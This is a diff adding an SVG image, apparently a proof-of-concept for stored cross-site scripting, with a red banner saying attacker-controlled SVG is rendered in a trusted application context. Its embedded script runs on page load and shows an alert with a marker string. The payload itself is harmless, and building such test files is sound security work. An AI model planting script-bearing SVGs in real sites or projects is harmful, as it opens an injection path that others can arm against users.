@@ -1,0 +1,31 @@
+<svg width="800" height="200" viewBox="0 0 800 200" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <style>
+      .bg-rect {
+        fill: #dc3545;
+        stroke: #c82333;
+        stroke-width: 2;
+      }
+      .main-text {
+        fill: #ffffff;
+        font-size: 24px;
+        font-family: 'Segoe UI', Arial, sans-serif;
+        font-weight: 500;
+      }
+    </style>
+  </defs>
+  
+  <rect class="bg-rect" x="10" y="10" width="780" height="180" rx="8"/>
+  
+  <text class="main-text" x="400" y="80" text-anchor="middle">
+    Attacker-controlled SVG is rendered inside
+  </text>
+  <text class="main-text" x="400" y="120" text-anchor="middle">
+    a trusted application context
+  </text>
+  <script type="text/javascript">
+  window.onload = function() {
+    alert("rhyru9");
+  };
+</script>
+</svg>
